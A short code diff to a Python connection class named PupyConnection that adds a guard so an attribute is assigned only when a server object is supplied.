@@ -12,7 +12,8 @@ class PupyConnection(Connection):
         self._last_recv = time.time()
         kwargs['_lazy'] = True
         Connection.__init__(self, *args, **kwargs)
-        self._local_root.pupy_srv = pupy_srv
+        if pupy_srv:
+            self._local_root.pupy_srv = pupy_srv
 
     def sync_request(self, handler, *args):
         seq = self._send_request(handler, args)
